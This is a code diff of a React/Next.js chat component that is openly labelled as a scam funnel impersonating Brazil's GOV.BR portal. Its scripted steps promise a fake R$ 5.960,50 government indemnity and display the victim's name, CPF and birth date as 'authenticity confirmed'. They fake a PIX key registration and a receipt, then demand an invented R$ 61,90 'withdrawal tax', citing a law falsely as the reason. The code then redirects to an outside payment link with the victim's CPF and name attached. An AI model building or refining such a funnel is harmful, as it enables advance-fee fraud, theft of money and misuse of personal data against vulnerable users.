@@ -2,8 +2,10 @@
 "use client";
 
 import React, { useState, useEffect, useRef, useMemo } from 'react';
-import { useRouter } from 'next/navigation';
-import { Loader2, VolumeX } from 'lucide-react';
+import { useRouter } // useRouter is not used but might be in future, so keeping import
+from 'next/navigation'; 
+import Image from 'next/image';
+import { Loader2, VolumeX, CheckCircle, AlertTriangle } from 'lucide-react';
 import dynamic from 'next/dynamic';
 import type PlyrInstance from 'plyr';
 import 'plyr-react/plyr.css';
@@ -28,147 +30,428 @@ interface Message {
   id: string;
   sender: 'bot' | 'user';
   text?: string;
-  options?: { text: string; value: string; nextStep?: keyof typeof flowDefinition }[];
+  options?: ChatOption[];
   isTyping?: boolean;
+  // For displayMessage type
+  displayTitle?: string;
+  displayDetails?: Record<string, string>;
+  displayIcon?: 'success_checkmark' | 'alert';
+  // For displayImage type
+  displayImageUrl?: string;
+  displayImageAlt?: string;
+  displayImageAiHint?: string;
 }
 
-interface FlowStepDetails {
-  botMessage?: string | ((params: SimulatedChatParams) => string);
-  options?:
-    | { text: string; value: string; nextStep?: keyof typeof flowDefinition }[]
-    | ((params: SimulatedChatParams) => { text: string; value: string; nextStep?: keyof typeof flowDefinition }[]);
-  nextStepAfterVideo?: keyof typeof flowDefinition;
-  nextStepAfterMessage?: keyof typeof flowDefinition; // New: For auto-proceeding after a message
-  isRedirectStep?: boolean;
+interface ChatOption {
+  text: string;
+  nextStep?: string;
+  action?: 'redirectToPayment';
+  paymentUrl?: string;
 }
 
-interface FlowDefinition {
-  [key: string]: FlowStepDetails;
+interface StepDataVideo {
+  title: string;
+  videoUrl: string;
 }
 
+interface StepDataMultipleChoice {
+  message: string;
+  options: ChatOption[];
+}
 
-const flowDefinition: FlowDefinition = {
-  intro_video: {
-    botMessage: "Primeiro clique no vídeo abaixo para iniciarmos o atendimento 👇",
-    nextStepAfterVideo: 'start_greeting',
-  },
-  start_greeting: {
-    botMessage: (params: SimulatedChatParams) => `Olá ${params.nome || 'usuário'}!`,
-    nextStepAfterMessage: 'start_message_1',
-  },
-  start_message_1: {
-    botMessage: "Nos últimos dias, milhares de brasileiros conseguiram sacar essa indenização do governo.",
-    nextStepAfterMessage: 'start_message_2',
-  },
-  start_message_2: {
-    botMessage: "Responda às perguntas a seguir para aprovação do seu saque de R$ 5.960,50.",
-    nextStepAfterMessage: 'start_prompt_mae',
-  },
-  start_prompt_mae: { // This was the original 'start'
-    botMessage: "Por favor, confirme o nome de sua mãe.",
-    options: [
-      { text: "Raquel Queiroz Santos", value: 'raquel_qs', nextStep: 'ask_mae_again' },
-      { text: "Fernanda de Sousa Rodrigues", value: 'fernanda_sr', nextStep: 'ask_mae_again' },
-      { text: "Eliane Da Silva Moreira", value: 'eliane_sm_correct', nextStep: 'ask_question_1' },
-      { text: "Nenhuma das alternativas.", value: 'nenhuma_mae', nextStep: 'ask_mae_again' }
-    ],
-  },
-  ask_mae_again: {
-    botMessage: "Por favor, digite o nome completo da sua mãe.",
-    options: [{text: "Ok, entendi (simulação)", value: 'mae_understood', nextStep: 'ask_question_1'}]
-  },
-  ask_question_1: {
-    botMessage: "Você possui alguma pendência financeira registrada no SERASA ou SPC?",
-    options: [
-      { text: "Sim", value: 'pendencia_sim', nextStep: 'ask_marital_status' },
-      { text: "Não", value: 'pendencia_nao', nextStep: 'ask_marital_status' },
-    ],
-  },
-  ask_marital_status: {
-    botMessage: "Qual seu estado civil?",
-    options: [
-      { text: "Solteiro (a)", value: 'solteiro', nextStep: 'ask_payment_method' },
-      { text: "Casado (a)", value: 'casado', nextStep: 'ask_payment_method' },
-      { text: "Divorciado (a)", value: 'divorciado', nextStep: 'ask_payment_method' },
-      { text: "Viúvo (a)", value: 'viuvo', nextStep: 'ask_payment_method' },
-    ],
-  },
-  ask_payment_method: {
-    botMessage: "Para a liberação do seu benefício, será necessário o pagamento de uma taxa única referente ao Imposto de Transmissão Social (ITS). Como deseja prosseguir?",
-    options: [
-      { text: "Pagar com Cartão de Crédito", value: 'cartao', nextStep: 'confirm_cpf' },
-      { text: "Pagar com PIX (via CPF)", value: 'pix_cpf', nextStep: 'confirm_cpf' },
-      { text: "Saber mais sobre a taxa", value: 'info_taxa', nextStep: 'explain_tax_briefly' },
-    ],
-  },
-  explain_tax_briefly: {
-    botMessage: "A taxa de Imposto de Transmissão Social (ITS) é um valor simbólico obrigatório para cobrir custos operacionais e garantir a segurança da transação e a liberação do seu benefício. O pagamento é processado de forma segura pela plataforma GOV.BR.",
-    options: [
-        { text: "Entendi, desejo pagar com PIX (CPF)", value: 'pix_cpf_after_explain', nextStep: 'confirm_cpf'},
-        { text: "Entendi, desejo pagar com Cartão", value: 'cartao_after_explain', nextStep: 'confirm_cpf'},
-        { text: "Voltar", value: 'back_to_payment_method', nextStep: 'ask_payment_method' },
-    ]
-  },
-  confirm_cpf: {
-    botMessage: (params: SimulatedChatParams) => `Seu CPF para o pagamento da taxa e recebimento do benefício é: ${params.cpf || 'Não informado'}. Está correto?`,
-    options: (params: SimulatedChatParams) => [
-      { text: "Sim, está correto.", value: 'cpf_correto', nextStep: 'ask_receipt' },
-      { text: "Não, desejo alterar.", value: 'cpf_incorreto', nextStep: 'handle_cpf_correction' },
-    ],
-  },
-  handle_cpf_correction: {
-    botMessage: "Entendido. Para corrigir seu CPF, por favor, reinicie o processo ou entre em contato com o suporte.",
-    options: [{ text: "Ok", value: 'cpf_correction_ack', nextStep: 'end_chat_early' }]
-  },
-  ask_receipt: {
-    botMessage: "Excelente! Após a confirmação do pagamento da taxa, o valor do benefício será liberado. Você deseja receber o comprovante de recebimento do benefício em seu e-mail cadastrado no GOV.BR?",
-    options: [
-      { text: "Sim, desejo receber meu comprovante.", value: 'receipt_yes', nextStep: 'final_info_before_payment' },
-      { text: "Não, obrigado.", value: 'receipt_no', nextStep: 'final_info_before_payment' },
-    ],
-  },
-  final_info_before_payment: {
-    botMessage: "Perfeito. Você está a um passo de receber sua indenização. A taxa ITS garante a liberação imediata após a confirmação.",
-    options: [
-      { text: "Concluir pagamento e receber minha indenização", value: 'proceed_to_payment', nextStep: 'redirect_to_payment' },
-      { text: "Porque tenho que pagar esse imposto?", value: 'ask_why_tax_again', nextStep: 'explain_tax_detailed' },
-    ],
-  },
-  explain_tax_detailed: {
-    botMessage: "O Imposto de Transmissão Social (ITS) é uma contribuição única e obrigatória, estabelecida para cobrir despesas administrativas e de processamento seguro da sua indenização através da plataforma GOV.BR. Este valor garante a conformidade legal e a agilidade na liberação dos seus fundos. Após o pagamento, o valor integral da indenização é disponibilizado imediatamente.",
-    options: [
-      { text: "Entendi. Concluir pagamento e receber indenização.", value: 'proceed_to_payment_after_detail', nextStep: 'redirect_to_payment' },
-      { text: "Ainda tenho dúvidas.", value: 'more_doubts', nextStep: 'support_contact' },
-    ],
-  },
-  support_contact: {
-    botMessage: "Para mais informações, por favor, acesse a seção de Ajuda no portal GOV.BR ou entre em contato com nosso suporte.",
-    options: [{ text: "Ok", value: 'support_ack', nextStep: 'end_chat_early' }]
-  },
-  redirect_to_payment: {
-    isRedirectStep: true,
-  },
-  end_chat_early: {
-    botMessage: "Obrigado por utilizar nossos serviços. Sessão encerrada."
-  }
-};
+interface StepDataLoading {
+  message: string;
+  duration_ms: number;
+}
+
+interface StepDataDisplayMessage {
+  title?: string;
+  message?: string;
+  icon?: 'success_checkmark' | 'alert';
+  details?: Record<string, string>;
+  audioUrl?: string;
+}
+
+interface StepDataDisplayImage {
+  message: string;
+  imageUrl: string;
+  imageAiHint?: string;
+}
+
+interface FlowStep {
+  type: 'video' | 'multipleChoice' | 'loading' | 'displayMessage' | 'displayImage';
+  data: StepDataVideo | StepDataMultipleChoice | StepDataLoading | StepDataDisplayMessage | StepDataDisplayImage;
+  nextStep?: string;
+}
+
+interface FunnelData {
+  funnelName: string;
+  initialStep: string;
+  steps: Record<string, FlowStep>;
+}
+
+const funnelDefinition: FunnelData = {
+    "funnelName": "Scam Indenizacao GovBR",
+    "initialStep": "step1_video",
+    "steps": {
+      "step1_video": {
+        "type": "video",
+        "data": {
+          "title": "Primeiro clique no vídeo abaixo para iniciarmos o atendimento 👇",
+          "videoUrl": "https://placeholder.url/video_golpe.mp4" // Placeholder, actual video recommended
+        },
+        "nextStep": "step2_ask_mother_name"
+      },
+      "step2_ask_mother_name": {
+        "type": "multipleChoice",
+        "data": {
+          "message": "Nos últimos dias, milhares de brasileiros conseguiram sacar essa indenização do governo.\n\nResponda às perguntas a seguir para aprovação do seu saque de R$ 5.960,50.\n\nPor favor, confirme o nome de sua mãe.",
+          "options": [
+            {"text": "Raquel Queiroz Santos", "nextStep": "step3_ask_gov_app"},
+            {"text": "Fernanda de Sousa Rodrigues", "nextStep": "step3_ask_gov_app"},
+            {"text": "{mae}", "nextStep": "step3_ask_gov_app"}, // Dynamic mother's name placeholder
+            {"text": "Nenhuma das alternativas.", "nextStep": "step3_ask_gov_app"}
+          ]
+        }
+      },
+      "step3_ask_gov_app": {
+        "type": "multipleChoice",
+        "data": {
+          "message": "Você já instalou ou acessou o GOV no seu celular?",
+          "options": [
+            {"text": "Sim", "nextStep": "step4_ask_civil_status"},
+            {"text": "Não", "nextStep": "step4_ask_civil_status"}
+          ]
+        }
+      },
+      "step4_ask_civil_status": {
+        "type": "multipleChoice",
+        "data": {
+          "message": "Qual seu estado civil?",
+          "options": [
+            {"text": "Solteiro (a)", "nextStep": "step5_loading_validation"},
+            {"text": "Casado (a)", "nextStep": "step5_loading_validation"},
+            {"text": "Divorciado (a)", "nextStep": "step5_loading_validation"},
+            {"text": "Viúvo (a)", "nextStep": "step5_loading_validation"}
+          ]
+        }
+      },
+      "step5_loading_validation": {
+        "type": "loading",
+        "data": {
+          "message": "Validando suas respostas...",
+          "duration_ms": 3000
+        },
+        "nextStep": "step6_confirmation"
+      },
+      "step6_confirmation": {
+        "type": "displayMessage",
+        "data": {
+          "title": "Autenticidade confirmada!",
+          "icon": "success_checkmark",
+          "details": { // Details will be dynamically populated
+            "Nome": "{nome}",
+            "CPF": "{cpf}",
+            "Data de Nascimento": "{nascimento}",
+            "Indenização": "R$ 5.960,50",
+            "Status": "Pré-aprovado"
+          },
+          "audioUrl": "https://placehold.co/audio_aprovado.mp3" // Placeholder audio
+        },
+        "nextStep": "step7_ask_pix_type"
+      },
+      "step7_ask_pix_type": {
+        "type": "multipleChoice",
+        "data": {
+          "message": "Selecione a chave PIX que deseja usar:",
+          "options": [
+            {"text": "Telefone", "nextStep": "step8_confirm_pix_key"},
+            {"text": "CPF", "nextStep": "step8_confirm_pix_key"},
+            {"text": "Email", "nextStep": "step8_confirm_pix_key"}
+          ]
+        }
+      },
+      "step8_confirm_pix_key": {
+        "type": "multipleChoice",
+        "data": {
+          "message": "ATENÇÃO: Verifique se a chave Pix informada está correta.\n\nChave: {cpf}\n\nO governo não se responsabiliza caso você informe a Chave PIX errada.",
+          "options": [
+            {"text": "Sim, está correto.", "nextStep": "step9_registering_pix"},
+            {"text": "Não, desejo corrigir.", "nextStep": "step7_ask_pix_type"}
+          ]
+        }
+      },
+      "step9_registering_pix": {
+        "type": "loading",
+        "data": {
+          "message": "Aguarde alguns segundos, estamos cadastrando sua chave PIX no sistema...",
+          "duration_ms": 2500
+        },
+        "nextStep": "step10_pix_registered"
+      },
+      "step10_pix_registered": {
+          "type": "displayMessage",
+          "data": {
+            "title": "Chave PIX Cadastrada",
+            "icon": "success_checkmark",
+            "message": "Sua chave pix foi cadastrada com sucesso!",
+            "details": { // Details will be dynamically populated
+              "Nome": "{nome}",
+              "Chave Pix": "{cpf}",
+              "Status": "Aprovado"
+            },
+            "audioUrl": "https://placehold.co/audio_chave_cadastrada.mp3" // Placeholder audio
+          },
+          "nextStep": "step11_ask_generate_receipt"
+      },
+      "step11_ask_generate_receipt": {
+          "type": "multipleChoice",
+          "data": {
+              "message": "Clique no botão abaixo para confirmar e liberar o envio da sua indenização para a chave PIX informada.\n\nIremos gerar seu comprovante do valor de R$ 5.960,50 neste instante.",
+              "options": [
+                  {"text": "Desejo receber meu comprovante de recebimento.", "nextStep": "step12_generate_receipt"}
+              ]
+          }
+      },
+      "step12_generate_receipt": {
+          "type": "displayImage",
+          "data": {
+              "message": "Gerando seu comprovante de recebimento dos valores...",
+              "imageUrl": "https://placehold.co/600x400.png", // Placeholder image
+              "imageAiHint": "receipt document"
+          },
+          "nextStep": "step13_reveal_tax"
+      },
+      "step13_reveal_tax": {
+          "type": "displayMessage",
+          "data": {
+              "title": "Indenização Governamental",
+              "details": { // Details will be dynamically populated where possible
+                  "Indenização disponível para saque": "R$ 5.960,50",
+                  "Titular": "{nome}",
+                  "Chave Pix": "{cpf}",
+                  "Imposto de Saque": "R$ 61,90"
+              }
+          },
+          "nextStep": "step14_explain_tax"
+      },
+      "step14_explain_tax": {
+          "type": "multipleChoice",
+          "data": {
+              "message": "⚠️ Seu dinheiro está vinculado ao seu CPF e somente você pode acessá-lo.\n\nPortanto, a taxa transacional paga ao solicitar o saque, não pode ser descontada do valor total que você tem a receber, devido à Lei que protege os direitos fundamentais de Privacidade e Segurança.\n\nLei n.º 13.709 de 14 de agosto de 2018",
+              "options": [
+                  {"text": "Concluir pagamento e receber minha indenização", "action": "redirectToPayment", "paymentUrl": "https://pay.finalizeseupagamento.com/2wq7Gr7YK5jgBAN"} // Example URL
+              ]
+          }
+      }
+    }
+  };
 
 
 const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ initialParams }) => {
   const [messages, setMessages] = useState<Message[]>([]);
-  const [currentStep, setCurrentStep] = useState<keyof typeof flowDefinition>('intro_video');
+  const [currentStepKey, setCurrentStepKey] = useState<string>(funnelDefinition.initialStep);
   const [isBotTyping, setIsBotTyping] = useState(true);
   const chatEndRef = useRef<HTMLDivElement>(null);
-  const router = useRouter();
+  const audioRef = useRef<HTMLAudioElement>(null);
 
+  // Video state
   const playerRef = useRef<PlyrInstance | null>(null);
   const [showVideoThumbnailOverlay, setShowVideoThumbnailOverlay] = useState(true);
-  const videoUrl = "https://225412.b-cdn.net/Video%20Page.mp4";
+  const [currentVideoUrl, setCurrentVideoUrl] = useState<string | null>(null);
 
-  const plyrSource = useMemo(() => ({
+  // Loading step state
+  const [isLoadingStep, setIsLoadingStep] = useState(false);
+  const [loadingMessage, setLoadingMessage] = useState<string | null>(null);
+
+  // DisplayImage step state
+  const [currentImageDetails, setCurrentImageDetails] = useState<{url: string; alt: string; message?: string, aiHint?: string} | null>(null);
+  
+  // DisplayMessage step state
+  const [currentDisplayMessage, setCurrentDisplayMessage] = useState<Message | null>(null);
+
+
+  const formatText = (text: string | undefined): string => {
+    if (!text) return '';
+    return text
+      .replace(/{nome}/g, initialParams.nome || 'Usuário')
+      .replace(/{cpf}/g, initialParams.cpf || 'CPF não informado')
+      .replace(/{mae}/g, initialParams.mae || 'Nome da mãe não informado')
+      .replace(/{nascimento}/g, initialParams.nascimento || 'Data de nasc. não informada');
+  };
+
+  const formatDetailsObject = (details: Record<string, string> | undefined): Record<string, string> | undefined => {
+    if (!details) return undefined;
+    const formatted: Record<string, string> = {};
+    for (const key in details) {
+      formatted[key] = formatText(details[key]);
+    }
+    return formatted;
+  };
+
+
+  useEffect(() => {
+    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
+  }, [messages, isLoadingStep, currentImageDetails, currentDisplayMessage]);
+
+  useEffect(() => {
+    const stepConfig = funnelDefinition.steps[currentStepKey];
+    if (!stepConfig) {
+      console.error("SimulatedChatFlow: Invalid step key:", currentStepKey);
+      return;
+    }
+
+    setIsBotTyping(true);
+    setIsLoadingStep(false);
+    setLoadingMessage(null);
+    setCurrentImageDetails(null);
+    setCurrentDisplayMessage(null);
+    setCurrentVideoUrl(null);
+
+    const processStep = async () => {
+      const botMessageId = `bot-${Date.now()}`;
+      let nextStepTransitionDelay = 1200; // Default delay for auto-transitions
+
+      switch (stepConfig.type) {
+        case 'video': {
+          const data = stepConfig.data as StepDataVideo;
+          setCurrentVideoUrl(data.videoUrl); // Show video player
+          setShowVideoThumbnailOverlay(true);
+          if (data.title) {
+            setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.title) }]);
+          }
+          // Video interaction will trigger next step via handleVideoThumbnailClick
+          setIsBotTyping(false);
+          return; 
+        }
+        case 'multipleChoice': {
+          const data = stepConfig.data as StepDataMultipleChoice;
+          const formattedOptions = data.options.map(opt => ({
+            ...opt,
+            text: formatText(opt.text)
+          }));
+          setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message), options: formattedOptions }]);
+          break;
+        }
+        case 'loading': {
+          const data = stepConfig.data as StepDataLoading;
+          setLoadingMessage(formatText(data.message));
+          setIsLoadingStep(true);
+          setIsBotTyping(false); // Typing indicator not needed during loading screen
+          setTimeout(() => {
+            setIsLoadingStep(false);
+            setLoadingMessage(null);
+            if (stepConfig.nextStep) {
+              setCurrentStepKey(stepConfig.nextStep);
+            }
+          }, data.duration_ms);
+          return; // Return early as transition is handled by timeout
+        }
+        case 'displayMessage': {
+          const data = stepConfig.data as StepDataDisplayMessage;
+          const displayMsg: Message = {
+            id: botMessageId,
+            sender: 'bot',
+            displayTitle: formatText(data.title),
+            text: data.message ? formatText(data.message) : undefined, // Use text for main message if present
+            displayDetails: formatDetailsObject(data.details),
+            displayIcon: data.icon,
+          };
+          setCurrentDisplayMessage(displayMsg); // Use state to render this special message block
+
+          if (data.audioUrl && audioRef.current) {
+            audioRef.current.src = data.audioUrl;
+            audioRef.current.play().catch(e => console.warn("Audio autoplay failed:", e));
+          }
+          nextStepTransitionDelay = 3500; // Longer delay for user to read message
+          break;
+        }
+        case 'displayImage': {
+          const data = stepConfig.data as StepDataDisplayImage;
+           if (data.message) {
+             setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message) }]);
+           }
+          setCurrentImageDetails({url: data.imageUrl, alt: "Comprovante", message: formatText(data.message), aiHint: data.imageAiHint || 'document image'});
+          nextStepTransitionDelay = 4000; // Longer delay for user to see image
+          break;
+        }
+        default:
+          console.error("SimulatedChatFlow: Unknown step type:", stepConfig.type);
+      }
+
+      setIsBotTyping(false);
+
+      // Auto-transition if nextStep is defined and not handled by options or video
+      if (stepConfig.nextStep && stepConfig.type !== 'multipleChoice' && stepConfig.type !== 'video') {
+        setTimeout(() => {
+          if (currentStepKey === stepConfig.nextStep) { // Check if we are still on the same step, to avoid race conditions
+             console.warn("SimulatedChatFlow: Avoiding re-transition to the same step:", stepConfig.nextStep);
+             return;
+          }
+          setCurrentStepKey(stepConfig.nextStep);
+        }, nextStepTransitionDelay);
+      }
+    };
+
+    // Delay bot message appearance for simulation
+    const appearanceDelay = (stepConfig.type === 'loading' || currentStepKey === funnelDefinition.initialStep) ? 0 : 700;
+    setTimeout(processStep, appearanceDelay);
+
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [currentStepKey, initialParams]); // initialParams included to re-evaluate messages if they change (though unlikely for this app's structure)
+
+  const handleOptionClick = (option: ChatOption) => {
+    const userMessageId = `user-${Date.now()}`;
+    setMessages(prev => [...prev, { id: userMessageId, sender: 'user', text: option.text }]);
+
+    if (option.action === 'redirectToPayment' && option.paymentUrl) {
+        let finalPaymentUrl = option.paymentUrl;
+        // Append initialParams to payment URL if not already there
+        const url = new URL(finalPaymentUrl);
+        Object.entries(initialParams).forEach(([key, value]) => {
+            if (value && !url.searchParams.has(key)) {
+                url.searchParams.set(key, value);
+            }
+        });
+        if (initialParams.cpf && !url.searchParams.has('document')) { // Specific mapping for 'document'
+            url.searchParams.set('document', initialParams.cpf.replace(/\D/g, ''));
+        }
+
+        window.location.href = url.toString();
+    } else if (option.nextStep) {
+      setCurrentStepKey(option.nextStep);
+    }
+  };
+  
+  const handleVideoThumbnailClick = async () => {
+    const stepConfig = funnelDefinition.steps[currentStepKey];
+    if (stepConfig.type !== 'video') return;
+
+    if (playerRef.current?.plyr) {
+      try {
+        playerRef.current.plyr.muted = false;
+        await playerRef.current.plyr.play();
+        setShowVideoThumbnailOverlay(false);
+        
+        if (stepConfig.nextStep) {
+          setTimeout(() => {
+            setCurrentStepKey(stepConfig.nextStep as string);
+          }, 500); // Short delay after video starts
+        }
+      } catch (error) {
+        console.error("Error trying to play/unmute video:", error);
+        if (stepConfig.nextStep) setCurrentStepKey(stepConfig.nextStep as string); // Proceed even if play fails
+      }
+    } else {
+        // Fallback if player isn't ready, though unlikely with dynamic import
+        if (stepConfig.nextStep) setCurrentStepKey(stepConfig.nextStep as string);
+    }
+  };
+
+  const plyrSource = useMemo(() => currentVideoUrl ? ({
     type: 'video' as const,
-    sources: [{ src: videoUrl, provider: 'html5' as const }],
-  }), [videoUrl]);
+    sources: [{ src: currentVideoUrl, provider: 'html5' as const }],
+  }) : null, [currentVideoUrl]);
 
   const plyrOptions = useMemo(() => ({
     controls: [],
@@ -179,141 +462,12 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
     playsinline: true,
   }), []);
 
-
-  useEffect(() => {
-    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
-  }, [messages]);
-
-  useEffect(() => {
-    const stepConfig = flowDefinition[currentStep];
-    if (!stepConfig) return;
-
-    if (currentStep === 'redirect_to_payment') {
-      handleRedirectToPayment();
-      return;
-    }
-    
-    setIsBotTyping(true);
-    
-    setTimeout(() => {
-      let botText = "";
-      if (typeof stepConfig.botMessage === 'function') {
-        botText = stepConfig.botMessage(initialParams);
-      } else if (typeof stepConfig.botMessage === 'string') {
-        botText = stepConfig.botMessage;
-      }
-
-      const newMessageId = `bot-${Date.now()}`;
-      const botMsg: Message = { id: newMessageId, sender: 'bot', text: botText };
-      
-      let shouldAddMessage = !!botText;
-
-      if (stepConfig.options) {
-         if (typeof stepConfig.options === 'function') {
-            botMsg.options = stepConfig.options(initialParams);
-         } else {
-            botMsg.options = stepConfig.options;
-         }
-         shouldAddMessage = true; 
-      }
-      
-      if (shouldAddMessage && currentStep !== 'intro_video') { 
-        setMessages(prev => [...prev, botMsg]);
-      } else if (currentStep === 'intro_video' && botText) {
-        // Ensure intro_video message is added if defined (it's handled once)
-        if (!messages.find(m => m.text === botText && m.sender === 'bot')) {
-            setMessages(prev => [...prev, {id: `bot-intro-${Date.now()}`, sender: 'bot', text: botText }]);
-        }
-      }
-      
-      setIsBotTyping(false);
-
-      if (stepConfig.nextStepAfterMessage && !stepConfig.options) {
-        setTimeout(() => { 
-            setCurrentStep(stepConfig.nextStepAfterMessage as keyof typeof flowDefinition);
-        }, 1200); 
-      }
-
-    }, 700); // Shorter delay for bot "typing" simulation
-
-  // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [currentStep, initialParams]);
-
-
-  const handleRedirectToPayment = () => {
-    const basePaymentUrl = "https://pay.finalizeseupagamento.com/2wq7Gr7YK5jgBAN";
-    const queryParams = new URLSearchParams();
-    if (initialParams.cpf) queryParams.set('document', initialParams.cpf.replace(/\D/g, ''));
-    if (initialParams.nome) queryParams.set('name', initialParams.nome);
-    if (initialParams.utm_campaign) queryParams.set('utm_campaign', initialParams.utm_campaign);
-    if (initialParams.utm_content) queryParams.set('utm_content', initialParams.utm_content);
-    if (initialParams.utm_medium) queryParams.set('utm_medium', initialParams.utm_medium);
-    if (initialParams.utm_source) queryParams.set('utm_source', initialParams.utm_source);
-    // utm_term is often part of these, let's add it as empty if not present or handle it if it becomes a param
-    queryParams.set('utm_term', initialParams.gclid || ''); // Using gclid as a proxy or ensure it's available
-
-    const finalUrl = `${basePaymentUrl}?${queryParams.toString()}`;
-    window.location.href = finalUrl;
-  };
-
-  const handleOptionClick = (optionValue: string, nextStepKey?: keyof typeof flowDefinition) => {
-    const userMessageId = `user-${Date.now()}`;
-    const currentStepConfig = flowDefinition[currentStep];
-    let userMessageText = optionValue;
-
-    if (currentStepConfig?.options) {
-        let currentOptions: { text: string; value: string; nextStep?: keyof typeof flowDefinition }[] = [];
-        if (typeof currentStepConfig.options === 'function') {
-            currentOptions = currentStepConfig.options(initialParams);
-        } else {
-            currentOptions = currentStepConfig.options;
-        }
-        const clickedOption = currentOptions.find(opt => opt.value === optionValue);
-        if (clickedOption) {
-            userMessageText = clickedOption.text;
-        }
-    }
-
-    setMessages(prev => [...prev, { id: userMessageId, sender: 'user', text: userMessageText }]);
-
-    if (nextStepKey) {
-      setCurrentStep(nextStepKey);
-    }
-  };
-  
-  const handleVideoThumbnailClick = async () => {
-    if (playerRef.current?.plyr) {
-      try {
-        playerRef.current.plyr.muted = false;
-        await playerRef.current.plyr.play();
-        setShowVideoThumbnailOverlay(false);
-        
-        const nextStep = flowDefinition.intro_video.nextStepAfterVideo;
-        if (nextStep) {
-          // No need to re-add intro message, it's handled by the step itself now
-          setTimeout(() => {
-            setCurrentStep(nextStep);
-          }, 500);
-        }
-      } catch (error) {
-        console.error("Error trying to play/unmute video:", error);
-        const nextStep = flowDefinition.intro_video.nextStepAfterVideo;
-        if (nextStep) setCurrentStep(nextStep);
-      }
-    } else {
-        const nextStep = flowDefinition.intro_video.nextStepAfterVideo;
-        if (nextStep) setCurrentStep(nextStep);
-    }
-  };
-
-
   return (
-    <div className="simulated-chat-container" style={{ height: '100%', overflowY: 'auto', display: 'flex', flexDirection: 'column', padding: '10px' }}>
-      {currentStep === 'intro_video' && (
+    <div className="simulated-chat-container" style={{ height: '100%', overflowY: 'auto', display: 'flex', flexDirection: 'column', padding: '10px', backgroundColor: '#f0f0f0' }}>
+      <audio ref={audioRef} style={{ display: 'none' }} />
+
+      {currentVideoUrl && plyrSource && (
         <div className="intro-video-section" style={{ marginBottom: '15px', padding: '10px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
-           <p style={{ textAlign: 'center', marginBottom: '10px', fontSize: '16px', color: '#333' }}>
-            {typeof flowDefinition.intro_video.botMessage === 'string' ? flowDefinition.intro_video.botMessage : ''}
-          </p>
           <div className="video-player-wrapper" style={{ position: 'relative', maxWidth: '100%', width:'auto', aspectRatio: '16/9', margin: '0 auto', borderRadius: '8px', overflow: 'hidden' }}>
             <Plyr
               ref={playerRef}
@@ -324,16 +478,9 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
               <div
                 onClick={handleVideoThumbnailClick}
                 style={{
-                  position: 'absolute',
-                  top: 0, left: 0, right: 0, bottom: 0,
-                  background: 'rgba(0,0,0,0.5)',
-                  display: 'flex',
-                  flexDirection: 'column',
-                  justifyContent: 'center',
-                  alignItems: 'center',
-                  cursor: 'pointer',
-                  color: 'white',
-                  zIndex: 10
+                  position: 'absolute', top: 0, left: 0, right: 0, bottom: 0,
+                  background: 'rgba(0,0,0,0.6)', display: 'flex', flexDirection: 'column',
+                  justifyContent: 'center', alignItems: 'center', cursor: 'pointer', color: 'white', zIndex: 10
                 }}
               >
                 <VolumeX size={48} />
@@ -344,19 +491,58 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
         </div>
       )}
 
+      {isLoadingStep && loadingMessage && (
+        <div className="loading-step-container" style={{ textAlign: 'center', padding: '20px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)'}}>
+          <Loader2 className="animate-spin" size={32} style={{ margin: '0 auto 10px auto', color: '#007bff' }} />
+          <p style={{ fontSize: '16px', color: '#333' }}>{loadingMessage}</p>
+        </div>
+      )}
+
+      {currentImageDetails && (
+        <div className="image-step-container" style={{ textAlign: 'center', padding: '15px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
+          {currentImageDetails.message && <p style={{ marginBottom: '10px', fontSize: '16px', color: '#333' }}>{currentImageDetails.message}</p>}
+          <Image src={currentImageDetails.url} alt={currentImageDetails.alt} width={400} height={300} style={{ maxWidth: '100%', height: 'auto', borderRadius: '4px', border: '1px solid #eee' }} data-ai-hint={currentImageDetails.aiHint}/>
+        </div>
+      )}
+      
+      {currentDisplayMessage && (
+        <div className={`message-container bot-message-container display-message-block`} style={{alignSelf: 'flex-start', maxWidth: '90%'}}>
+           <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" />
+           <div className="message bot-message" style={{width: '100%'}}>
+              {currentDisplayMessage.displayTitle && <h3 style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '17px', color: '#0056b3' }}>
+                {currentDisplayMessage.displayIcon === 'success_checkmark' && <CheckCircle size={20} style={{ color: 'green', marginRight: '8px', verticalAlign: 'bottom' }} />}
+                {currentDisplayMessage.displayIcon === 'alert' && <AlertTriangle size={20} style={{ color: 'orange', marginRight: '8px', verticalAlign: 'bottom' }} />}
+                {currentDisplayMessage.displayTitle}
+              </h3>}
+              {currentDisplayMessage.text && <p style={{ marginBottom: currentDisplayMessage.displayDetails ? '12px' : '0', whiteSpace: 'pre-line' }}>{currentDisplayMessage.text}</p>}
+              {currentDisplayMessage.displayDetails && (
+                <div className="details-grid" style={{ borderTop: '1px solid #e0e0e0', paddingTop: '10px', display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '6px 12px', fontSize: '14px' }}>
+                  {Object.entries(currentDisplayMessage.displayDetails).map(([key, value]) => (
+                    <React.Fragment key={key}>
+                      <span style={{ fontWeight: '500', color: '#555' }}>{key}:</span>
+                      <span style={{ color: '#333' }}>{value}</span>
+                    </React.Fragment>
+                  ))}
+                </div>
+              )}
+           </div>
+        </div>
+      )}
+
+
       {messages.map((msg) => (
           <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
             {msg.sender === 'bot' && (
